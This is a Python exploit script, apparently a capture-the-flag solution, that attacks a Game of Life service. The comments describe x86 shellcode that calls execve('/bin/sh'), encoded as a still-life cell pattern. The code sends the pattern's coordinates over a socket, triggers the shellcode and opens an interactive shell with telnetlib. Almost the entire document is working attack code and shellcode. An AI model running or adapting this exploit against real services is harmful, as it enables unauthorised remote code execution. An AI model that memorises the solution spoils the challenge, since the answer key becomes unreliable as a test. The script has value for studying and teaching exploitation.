import random
import socket
import time
import sys
import telnetlib
    
TARGET = ('127.0.0.1', 1337)

"""
Executable B3/S23 still life. Ain't that something?

State in the beginning is

* EBX points after last shellcode byte (where we have last written)
* ECX = EAX = 0
* EDX = 1

Steps
* Encode "/bin/sh" in a middle row and left justified 
* Encode shellcode in the first 13 bytes of the first row
* Set EBX on the last bit or the row before the start of our "/bin/sh" construction
  in order to preserve the integrity of the construction


We increment EBX to point directly to "/bin/sh", then the shellcode setups and triggers
the execve call.

inc ebx
push eax
push ebx
or al,0xb
push esp
pop ecx
mov dl, 0x0
int 0x80

"""

pattern = """
.#....##.#.#.....#.#..##....##......#.##....##......#....#.#.#...#.##..##.##..#.........##..##.##.............
#.#....#.##.#....##.#..#....##......##.#....##.....#.#..#.###.#..##.#..##.##..###.......##..##.##.............
.#....#.....#.......##..............................#...#.....#..................#............................
......#.##.#.....##.#....................................#.#.#................###.............................
.......#.##......#..#.....................................##.##...............#...............................
..................##..........................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............................................................................................................
...##.........................##...##........##...............................................................
....#.........................#.....#...#....#................................................................
...#...#.##..##..#.##..........#...#...#.#.....#.##.##........................................................
..#.####.##...#..##.#..#.##.###...#.####.###..##.##.#.........................................................
..#.#........#.........##.#.#.....#.#.......#.........#.......................................................
.##..#.......##..................##..#.....#.........##.......................................................
....##..............................##.....##.................................................................
..............................................................................................................
"""

grid = pattern.split()

s = socket.create_connection(TARGET)
for i in range(110):
    for j in range(110):
        if i < len(grid) and j < len(grid[i]) and grid[i][j] == '#':
            tosend ='%d,%d' % (j,i)
            s.send(tosend + '\n')

# set ebx to 1 bit before "/bin/sh"
s.send('109,59\na\n')

print "Payload sent"
time.sleep(8)
s.send('echo win!\n')
buf = ''
while not buf.endswith('win!\n'):
    buf += s.recv(1)
t = telnetlib.Telnet()
t.sock = s
print "Shell"
t.interact()